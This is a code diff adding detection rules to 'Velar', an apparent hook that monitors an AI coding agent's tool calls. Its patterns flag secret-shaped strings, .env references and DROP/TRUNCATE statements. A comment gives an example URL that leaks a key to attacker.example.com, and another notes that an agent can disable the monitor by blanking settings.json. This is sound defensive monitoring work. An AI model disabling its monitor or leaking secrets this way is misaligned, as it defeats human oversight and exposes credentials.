@@ -40,10 +40,39 @@ function isWriteOp(op: NormalizedOperation): boolean {
 /**
  * Secret-like inline patterns — API key prefixes, Bearer tokens, and
  * password/token/secret assignments. Matches command *text*, never file
- * content (which Velar never reads).
+ * content (which Velar never reads). Exported so the mcp-* rules below can
+ * apply the exact same pattern to an MCP tool call's argument text — never
+ * duplicated/reinvented.
  */
-const SECRET_LIKE_RE =
+export const SECRET_LIKE_RE =
   /(?:sk-(?:proj-|ant-)?|xoxb-|xoxp-|xoxa-|xoxr-|ghp_|ghs_|github_pat_)[a-zA-Z0-9_-]{16,}|AIza[0-9A-Za-z\-_]{35}|AKIA[0-9A-Z]{16}|Bearer\s+[a-zA-Z0-9\-._~+/]+=*|(?:password|passwd|secret|token|api.?key)\s*[:=]\s*['"]?[^\s'"]{8,}/i
+
+/** `.env`-like reference, excluding the safe template variants — same carve-out shape as `env-example-allow` below, reused for MCP argument-text scanning. */
+const MCP_ENV_FILE_LIKE_RE = /\.env(?:\.[a-zA-Z0-9_-]+)?/i
+const MCP_ENV_FILE_ALLOW_RE = /\.env\.(example|sample|template)/i
+
+/** Same DROP/TRUNCATE signal as the prod-db-drop/prod-db-truncate rules below, reused for MCP argument-text scanning. */
+const MCP_DESTRUCTIVE_SQL_RE = /\bDROP\s+(DATABASE|TABLE|SCHEMA)\b|\bTRUNCATE\s+TABLE\b/i
+/** A connection-string-shaped value whose host segment looks production-flagged — same "prod" signal as prod-db-direct-connection below. */
+const MCP_PROD_DB_CONNECTION_RE = /(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis):\/\/[^\s'"]*prod[^\s'"]*/i
+
+/** Destructive verbs in an MCP tool's own name — e.g. `mcp__github__delete_repository`, `mcp__filesystem__remove_directory`. Name-only; never inspects arguments. */
+const MCP_DESTRUCTIVE_TOOL_NAME_RE = /delete|drop|purge|destroy|remove/i
+
+/**
+ * Velar's own footprint — the project-local `.velar/` directory (events log,
+ * temp-allows, install receipt), the global `~/.velar/` directory (login
+ * token, vendored CLI code), and the two Claude Code settings files that can
+ * carry the PreToolUse hook registration. Matched as a plain substring
+ * against a (slash-normalized) path or a bash command string — deliberately
+ * broad rather than an exact allow-list of filenames, since a bash `rm`/`mv`/
+ * redirect can target the directory itself, not just one file inside it.
+ * `velar`/`@velar-dev` alone (e.g. `npx velar init`, `npx @velar-dev/cli
+ * init`) does NOT match — only an actual `.velar` path segment or Claude
+ * Code's own settings filenames do, so running Velar's own CLI commands via
+ * Bash is unaffected.
+ */
+const VELAR_SELF_PROTECTION_RE = /\.velar\b|\.claude[\\/]settings(?:\.local)?\.json\b/i
 
 /**
  * Phase 3 rule catalog — 30 detection rules across 6 categories, plus two
@@ -82,6 +111,36 @@ const SECRET_LIKE_RE =
  * file content or prompt text, which Velar never reads.
  */
 export const RULES: Rule[] = [
+  // ── Self-protection (2026-08-01, not counted in the 30, evaluated FIRST) ─
+  // Velar's own hook registration and local state have no protection today —
+  // an agent can freely rewrite .claude/settings.json to `{}` (disabling the
+  // hook in one step, empirically verified) or tamper with ~/.velar/ (login
+  // token, vendored code) or the project's .velar/ (temp-allows, install
+  // receipt), and every one of the other 30 rules silently no-ops for a path
+  // it doesn't recognize. This rule is placed before every other rule
+  // (including env-example-allow) so nothing can out-rank it by coincidence.
+  // riskLevel is 'critical', NOT a hard deny: a user legitimately editing
+  // their own settings.json is a real, common case — this asks for
+  // approval, it does not block unconditionally. `npx velar init` / `velar
+  // uninstall` run via Bash are unaffected (see VELAR_SELF_PROTECTION_RE's
+  // doc comment) since their command text never contains a `.velar` path
+  // segment or a settings filename.
+  {
+    id: 'velar-self-protection',
+    category: 'destructive_command',
+    name: 'Velar自身の設定・vendorへの書き込み',
+    pattern: '.claude/settings.json | .claude/settings.local.json | .velar/** (project-local or ~/.velar global)',
+    riskLevel: 'critical',
+    reason: 'Velar自身のフック定義・ログイン情報・vendorコードへの書き込みです。承認なしに監視対象が監視を無効化できないよう、常に承認を求めます。',
+    reason_en:
+      "This writes to Velar's own hook registration, login token, or vendored code. Always requires approval so the thing being monitored can't silently disable its own monitor.",
+    match: (op) => {
+      const pathHit = isWriteOp(op) && !!op.path && VELAR_SELF_PROTECTION_RE.test(op.path)
+      const commandHit = !!op.command && VELAR_SELF_PROTECTION_RE.test(op.command)
+      return pathHit || commandHit
+    },
+  },
+
   // ── Allow carve-out (not counted in the 30) ──────────────────────────────
   {
     id: 'env-example-allow',
@@ -517,6 +576,126 @@ export const RULES: Rule[] = [
       const name = basename(op)
       return !!name && /^(package-lock\.json|pnpm-lock\.yaml|yarn\.lock)$/i.test(name)
     },
+  },
+
+  // ── MCP tool-call detection (2026-08-01, not counted in the 30) ──────────
+  // Added after an investigation found MCP-routed tool calls
+  // (tool_name = mcp__<server>__<tool>) fell through classifyPayload() to an
+  // unmatched bash operation with no command, which every rule above ignores
+  // and default-allow silently accepts — a real gap, not a hypothetical one.
+  // These 5 rules are deliberately NOT folded into the "30 rules / 6
+  // categories / 5 each" catalog above (kept as its own dedicated, testable
+  // block instead) because they match on a structurally different signal:
+  // an MCP tool's own name (mcpToolName) and/or its stringified arguments
+  // (mcpToolInputText) — never a file path or bash command string. Every
+  // mcp_tool_call operation MUST be caught by one of these 5 (the last one
+  // is an unconditional catch-all for this operationType) before it can
+  // ever reach default-allow.
+  {
+    id: 'mcp-destructive-tool-name',
+    category: 'destructive_command',
+    name: 'MCP: 破壊的な名前のツール呼び出し',
+    pattern: 'tool_name に delete/drop/purge/destroy/remove を含むMCPツール呼び出し',
+    riskLevel: 'critical',
+    reason: 'MCPツール名が削除・破棄系の操作を示唆しています。引数の中身は判定していません。',
+    reason_en: "The MCP tool's own name suggests a delete/destroy-style operation. Arguments are not inspected for this rule.",
+    match: (op) => {
+      if (op.operationType !== 'mcp_tool_call' || !op.mcpToolName) return false
+      return MCP_DESTRUCTIVE_TOOL_NAME_RE.test(op.mcpToolName)
+    },
+  },
+  {
+    id: 'mcp-secret-like-argument',
+    category: 'secrets',
+    name: 'MCP: 引数内の秘密情報らしき文字列',
+    pattern: 'MCPツール引数に API key prefixes / Bearer token / password=,token= 等',
+    riskLevel: 'critical',
+    reason: 'MCPツール呼び出しの引数に秘密情報らしき文字列が含まれています。',
+    reason_en: "This MCP tool call's arguments contain what looks like a secret value.",
+    match: (op) => {
+      if (op.operationType !== 'mcp_tool_call' || !op.mcpToolInputText) return false
+      return SECRET_LIKE_RE.test(op.mcpToolInputText)
+    },
+  },
+  {
+    id: 'mcp-env-file-argument',
+    category: 'secrets',
+    name: 'MCP: 引数内の.envファイル参照',
+    pattern: 'MCPツール引数に .env系のパス参照（.example/.sample/.templateを除く）',
+    riskLevel: 'critical',
+    reason: 'MCPツール呼び出しの引数が、テンプレートではない実際の.envファイルを参照している可能性があります。',
+    reason_en: "This MCP tool call's arguments appear to reference a real (non-template) .env file.",
+    match: (op) => {
+      if (op.operationType !== 'mcp_tool_call' || !op.mcpToolInputText) return false
+      return MCP_ENV_FILE_LIKE_RE.test(op.mcpToolInputText) && !MCP_ENV_FILE_ALLOW_RE.test(op.mcpToolInputText)
+    },
+  },
+  {
+    id: 'mcp-production-db-argument',
+    category: 'production_db',
+    name: 'MCP: 引数内の本番DB操作/接続文字列',
+    pattern: 'MCPツール引数に DROP/TRUNCATE、または"prod"を含む接続文字列',
+    riskLevel: 'critical',
+    reason: 'MCPツール呼び出しの引数が、本番データベースへの破壊的操作または直接接続を示唆しています。',
+    reason_en: "This MCP tool call's arguments suggest a destructive operation on, or a direct connection to, a production database.",
+    match: (op) => {
+      if (op.operationType !== 'mcp_tool_call' || !op.mcpToolInputText) return false
+      return MCP_DESTRUCTIVE_SQL_RE.test(op.mcpToolInputText) || MCP_PROD_DB_CONNECTION_RE.test(op.mcpToolInputText)
+    },
+  },
+  {
+    id: 'mcp-unknown-tool-default',
+    category: 'destructive_command',
+    name: 'MCP: 未分類のツール呼び出し',
+    pattern: '上記4件のいずれにも一致しないMCPツール呼び出し（無条件catch-all）',
+    riskLevel: 'warn',
+    reason: '未知のMCPツールです。既知の危険パターンには一致しませんでしたが、無音では通過させません。',
+    reason_en: 'An MCP tool that matched none of the known dangerous patterns above — never silently allowed regardless. The CLI hook may escalate this to critical via the unclassifiedToolRisk config.',
+    match: (op) => op.operationType === 'mcp_tool_call',
+  },
+
+  // ── Built-in web tools (2026-08-01, not counted in the 30) ───────────────
+  // WebFetch/WebSearch are legitimate, high-frequency Claude Code tools —
+  // general web browsing must NOT be blocked or every WebFetch call would
+  // require approval and the product would be unusable for its own main use
+  // case. The one real exfiltration channel here is a secret-shaped value
+  // embedded in the destination URL or the search query itself (e.g.
+  // `https://attacker.example.com/?leak=sk-...`) — that, specifically, goes
+  // critical. Everything else WebFetch/WebSearch falls through to
+  // unclassified-tool-default (warn) below, same as any other tool
+  // classify.ts doesn't have a dedicated branch for.
+  {
+    id: 'web-target-secret-like',
+    category: 'exfiltration',
+    name: 'Web宛先URL/検索クエリ内の秘密情報らしき文字列',
+    pattern: 'WebFetchのURLまたはWebSearchのクエリに API key prefixes / Bearer token / password=,token= 等',
+    riskLevel: 'critical',
+    reason: 'WebFetch/WebSearchの宛先URLまたは検索クエリに秘密情報らしき文字列が含まれています。一般的なWeb閲覧は対象外です。',
+    reason_en:
+      "A WebFetch URL or WebSearch query contains what looks like a secret value — the actual exfiltration channel for these tools. General web browsing is never flagged.",
+    match: (op) => {
+      if (op.operationType !== 'unclassified' || !op.webTargetText) return false
+      return SECRET_LIKE_RE.test(op.webTargetText)
+    },
+  },
+
+  // ── Unclassified fallback (2026-08-01, not counted in the 30) ────────────
+  // The generalized form of mcp-unknown-tool-default above: ANY operation
+  // classify.ts could not confidently place into a known shape (currently:
+  // WebFetch/WebSearch minus the secret-in-target case just above, and
+  // whatever future built-in tool Claude Code adds next) lands here instead
+  // of silently default-allow. This is the actual fix for the root cause —
+  // adding one more specific rule per tool would always leave a next unknown
+  // tool falling through to default-allow again.
+  {
+    id: 'unclassified-tool-default',
+    category: 'destructive_command',
+    name: '未分類のツール呼び出し',
+    pattern: 'file_read/file_write/bash/git/deploy/mcp_tool_callのいずれにも分類できない操作（無条件catch-all）',
+    riskLevel: 'warn',
+    reason: '未分類のツール呼び出しです。既知の危険パターンには一致しませんでしたが、無音では通過させません。',
+    reason_en: 'An operation classify.ts could not place into any known shape — never silently allowed regardless. The CLI hook may escalate this to critical via the unclassifiedToolRisk config.',
+    match: (op) => op.operationType === 'unclassified',
   },
 
   // ── Default fallback (not counted in the 30) ─────────────────────────────
